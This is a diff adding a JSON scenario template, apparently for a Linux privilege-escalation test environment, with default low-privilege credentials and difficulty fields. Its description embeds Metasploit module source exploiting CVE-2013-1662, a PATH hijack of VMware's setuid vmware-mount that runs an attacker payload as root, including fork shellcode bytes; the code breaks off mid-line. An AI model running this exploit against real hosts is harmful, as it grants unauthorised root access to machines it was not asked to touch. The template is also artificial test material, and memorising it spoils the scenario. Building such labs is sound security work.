@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_27938",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: VMware - Setuid VMware-mount Unsafe popen(3) (Metasploit) (CVE-2013-1662;OSVDB-96588)\n\nExploit source code (27938.rb):\n```\n##\n# This file is part of the Metasploit Framework and may be subject to\n# redistribution and commercial restrictions. Please see the Metasploit\n# web site for more information on licensing and terms of use.\n#   http://metasploit.com/\n##\n\nrequire 'msf/core'\nrequire 'rex'\nrequire 'msf/core/post/common'\nrequire 'msf/core/post/file'\n\nclass Metasploit4 < Msf::Exploit::Local\n\n  include Msf::Exploit::EXE\n  include Msf::Post::Common\n  include Msf::Post::File\n\n  def initialize(info={})\n    super( update_info( info, {\n        'Name'          => 'VMWare Setuid vmware-mount Unsafe popen(3)',\n        'Description'   => %q{\n          VMWare Workstation (up to and including 9.0.2 build-1031769)\n          and Player have a setuid executable called vmware-mount that\n          invokes lsb_release in the PATH with popen(3). Since PATH is\n          user-controlled, and the default system shell on\n          Debian-derived distributions does not drop privs, we can put\n          an arbitrary payload in an executable called lsb_release and\n          have vmware-mount happily execute it as root for us.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        =>\n          [\n            'Tavis Ormandy', # Vulnerability discovery and PoC\n            'egypt' # Metasploit module\n          ],\n        'Platform'      => [ 'linux' ],\n        'Arch'          => ARCH_X86,\n        'Targets'       =>\n          [\n            [ 'Automatic', { } ],\n          ],\n        'DefaultOptions' => {\n          \"PrependSetresuid\" => true,\n          \"PrependSetresgid\" => true,\n        },\n        'Privileged'     => true,\n        'DefaultTarget' => 0,\n        'References' => [\n          [ 'CVE', '2013-1662' ],\n          [ 'OSVDB', '96588' ],\n          [ 'BID', '61966'],\n          [ 'URL', 'http://blog.cmpxchg8b.com/2013/08/security-debianisms.html' ],\n          [ 'URL', 'http://www.vmware.com/support/support-resources/advisories/VMSA-2013-0010.html' ]\n        ],\n        'DisclosureDate' => \"Aug 22 2013\"\n      }\n      ))\n    # Handled by ghetto hardcoding below.\n    deregister_options(\"PrependFork\")\n  end\n\n  def check\n    if setuid?(\"/usr/bin/vmware-mount\")\n      CheckCode::Vulnerable\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    unless check == CheckCode::Vulnerable\n      fail_with(Failure::NotVulnerable, \"vmware-mount doesn't exist or is not setuid\")\n    end\n\n    # Ghetto PrependFork action which is apparently only implemented for\n    # Meterpreter.\n    # XXX Put this in a mixin somewhere\n    # if(fork()) exit(0);\n    # 6A02              push byte +0x2\n    # 58                pop eax\n    # CD80              int 0x80 ; fork\n    # 85C0              test eax,eax\n    # 7406              jz 0xf\n    # 31C0              xor eax,eax\n    # B001              mov al,0x1\n    # CD80              int 0x80 ; exit\n    exe = generate_payload_exe(\n      :code => \"\\x6a\\x02\\x58\\xcd\\x80\\x85\\xc0\\x74\\x06\\x31\\xc0\\xb0\\x01\\xcd\\x80\" + payload.encoded\n    )\n    write_file(\"lsb_release\", e\n```",
+  "cve": "CVE-2013-1662;OSVDB-96588",
+  "exploitdb_id": "27938",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_27938",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
